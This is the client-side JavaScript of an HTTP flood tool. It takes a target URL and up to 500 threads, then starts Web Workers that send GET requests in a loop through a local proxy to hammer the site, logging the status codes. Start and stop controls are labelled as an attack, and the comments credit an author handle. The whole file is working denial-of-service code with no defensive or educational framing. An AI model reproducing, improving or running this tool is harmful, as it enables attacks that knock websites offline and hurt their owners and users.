let running = false;
let workers = [];
const logDiv = document.getElementById('log');

//Credit to Black Beard @Ilzci
const proxyUrl = 'http://localhost:3000/proxy?url=';

function log(msg, color = 'black') {
  const p = document.createElement('p');
  p.textContent = msg;
  p.style.color = color;
  logDiv.appendChild(p);
  logDiv.scrollTop = logDiv.scrollHeight;
}

async function startAttack(url, threadCount) {
  running = true;
  logDiv.textContent = '';
  log(`Starting attack on ${url} with ${threadCount} threads...`, 'blue');
//Credit to Black Beard @Ilzci
  try {
    const response = await fetch(proxyUrl + encodeURIComponent(url), {
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; ProxyBot/1.0)',
        'Accept': '*/*',
      }
    });
    log(`Initial test request status: ${response.status}`, 'gray');
  } catch (err) {
    log(`Initial request error: ${err.message}`, 'red');
  }
//Credit to Black Beard @Ilzci
  for (let i = 0; i < threadCount; i++) {
    const worker = new Worker(URL.createObjectURL(new Blob([`
      self.onmessage = function(e) {
        const url = e.data.url;
        const proxyUrl = e.data.proxyUrl;
        let running = true;
        self.onmessage = function(event) {
          if (event.data === 'stop') running = false;
        };
        async function attack() {
          while (running) {
            try {
              const response = await fetch(proxyUrl + encodeURIComponent(url), {
                method: 'GET',
                mode: 'cors',
                cache: 'no-store'
              });
              if (response.ok) {
                self.postMessage({ status: 'success', code: response.status });
              } else {
                self.postMessage({ status: 'fail', code: response.status });
              }
            } catch (err) {
              self.postMessage({ status: 'error', message: err.message });
            }
            await new Promise(r => setTimeout(r, 50 + Math.random() * 100));
          }
          self.close();
        }
        attack();
      };
    `], { type: 'application/javascript' })));
//Credit to Black Beard @Ilzci
    worker.onmessage = function(e) {
      const data = e.data;
      if (data.status === 'success') {
        log(`Send Request ${url}, Status Code: ${data.code}`, 'green');
      } else if (data.status === 'fail') {
        log(`Request to ${url} returned status: ${data.code}`, 'orange');
      } else if (data.status === 'error') {
        log(`Error Request to ${url} : ${data.message}`, 'red');
      }
    };

    worker.postMessage({ url, proxyUrl });
    workers.push(worker);
  }
}
//Credit to Black Beard @Ilzci
function stopAttack() {
  running = false;
  for (const worker of workers) {
    worker.postMessage('stop');
  }
  workers = [];
  log('Attack stopped.', 'red');
}

document.getElementById('start').addEventListener('click', () => {
  if (running) {
    log('Attack already running.', 'red');
    return;
  }
  const url = document.getElementById('url').value.trim();
  const threads = parseInt(document.getElementById('threads').value);
  if (!url) {
    log('Please enter a valid URL.', 'red');
    return;
  }
  if (threads < 1 || threads > 500) {
    log('Threads must be between 1 and 500.', 'red');
    return;
  }
  startAttack(url, threads);
  document.getElementById('start').disabled = true;
  document.getElementById('stop').disabled = false;
});
//Credit to Black Beard @Ilzci
document.getElementById('stop').addEventListener('click', () => {
  stopAttack();
  document.getElementById('start').disabled = false;
  document.getElementById('stop').disabled = true;
});

//Credit to Black Beard @Ilzci